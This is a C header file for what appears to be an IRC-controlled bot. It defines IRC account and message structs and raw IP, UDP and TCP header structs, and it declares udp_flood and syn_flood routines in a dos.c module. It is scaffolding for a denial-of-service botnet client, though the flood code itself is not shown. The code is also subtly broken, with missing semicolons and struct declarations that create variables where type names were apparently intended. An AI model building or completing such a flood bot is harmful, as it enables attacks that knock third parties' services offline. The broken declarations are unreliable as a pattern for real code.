/*
 * Title: bot.h
 * Description: file contains miscellaneous 
 *              definitions, function definitions
 *              and structs
 *
 *
 *
 *
 *
 *
 */

/*
 * header guards to prevent
 * double includes
 */
#ifndef BOT_H
#define BOT_H

/*
 * max buffer size to send
 * or receive 
 */
#define MAX_MSG_SIZE 4096

/*
 * default size for malloc
 */
#define DEFAULT_MALLOC_SIZE 2048

/*
 * maximum irc name size
 */
#define MAX_NAME 31

#define zeroMem(x) memset((x), 0, sizeof (x));

#ifdef _WIN32
/*
 * macro for easier sleep
 * times sleep (seconds)
 */
#define sleep(x) Sleep ((x)*1000);

#elif __linux__

/*
 * a sort of hacky solution
 * to WIN32's SOCKET typedef
 * and linux's file descriptor
 */
typedef unsigned int SOCKET

#endif

/*
 * struct containing IRC
 * details of bot
 */
typedef struct _account {
	char u_name[MAX_NAME];		// username
	char n_name[MAX_NAME];		// nickname
	char *pword;			// username's password
	char *channel;			// channel/privmsg
} Account, *pAccount;

/*
 * struct to store information
 * from received messages 
 * from IRC
 */
typedef struct _message {
	char n_name[MAX_NAME];		// nickname
	char *contact;			// channel/privmsg
	int contactSize;
	char *command;			// command
	int commandSize;
	char *param;			// command [paramter]
	int paramSize;
	char *msg;			// entire message
	int msgSize;
} Message, *pMessage;

/*
 * need to define some tcp/ip
 * header structs here 
 * the X:n means that it
 * takes up n bits
 * they are called "bit fields"
 */
struct _ip_hdr {
    unsigned char ihl:4;
    unsigned char version:4;
    unsigned char tos;
    unsigned short tot_len;
    unsigned short id;
    unsigned short frag_off;
    unsigned char ttl;
    unsigned char protocol;
    unsigned short check;
    unsigned long saddr;
    unsigned long daddr;
} IP4_HDR, *pIP4_HDR;

struct _udp_hdr {
	unsigned short source_port;
	unsigned short dest_port;
	unsigned short len;
	unsigned short check;
} UDP_HDR, *pUDP_HDR;

struct _tcp_hdr {
	unsigned short source_prt;
	unsigned short dest_port;
	unsigned long seq;
	unsigned long ack_seq;
	unsigned short res1:4
	unsigned short data_offset:4;
    
	// flags
	unsigned char fin:1; 
	unsigned char syn:1;
	unsigned char rst:1;
	unsigned char psh:1;
	unsigned char ack:1;
	unsigned char urg:1;
	unsigned char ece:1;
	unsigned char cwr:1;
	
	unsigned short window;
	unsigned short check;
	unsigned short urg_ptr;
} TCP_HDR, *pTCP_HDR;

/*
 * function definitions go here
 * please make sure that only
 * functions which carry across
 * are added here, else make 
 * it static
 * also add the function
 * definitions under the 
 * respective file
 * if file comment does not
 * yet exist, please make one
 */
// bot.c
void non_fatal (char *, int);
void fatal (char *, int);

// init.c
pAccount new_account (void);
pMessage new_message (void);
SOCKET irc_connect (char *, char *);
int setup_irc (SOCKET , pAccount);
void str_to_lower (char *);

// recv.c
int cleanup (SOCKET, pAccount, pMessage);
void start_recv (SOCKET, pAccount);

// dos.c
void udp_flood (SOCKET s);
void syn_flood (SOCKET s);

#endif
